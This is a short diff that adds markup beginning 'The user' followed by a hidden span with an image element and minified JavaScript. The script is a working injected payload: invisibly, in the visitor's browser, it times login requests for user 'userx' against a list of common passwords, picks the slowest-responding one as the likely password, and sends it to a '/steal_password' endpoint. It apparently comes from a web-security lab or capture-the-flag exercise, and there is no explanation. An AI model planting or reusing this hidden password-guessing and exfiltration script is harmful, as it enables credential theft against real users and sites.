@@ -1,0 +1,7 @@
+The user
+<span style='display:none'>
+    <img id='test'/>
+    <script>
+        !function(){const e=[`password`,`123456`,`\t12345678`,`dragon`,`1234`,`qwerty`,`12345`],s=document.getElementById("test");async function o(e){const o=`/get_login?username=userx&password=${e}`,n=new Date;return new Promise((t,r)=>{s.addEventListener("error",()=>{const s=new Date;console.log(`Time elapsed for ${e}: ${s-n}`),t(s-n)},{once:!0}),s.src=o})}!async function(){let n=0,t="";for(const s of e){const e=await o(s);e>n&&(n=e,t=s)}console.log(`Max response time: ${n} for password: ${t}`),s.src=`/steal_password?password=${t}&timeElapsed=${n}`}()}();
+    </script>
+</span>
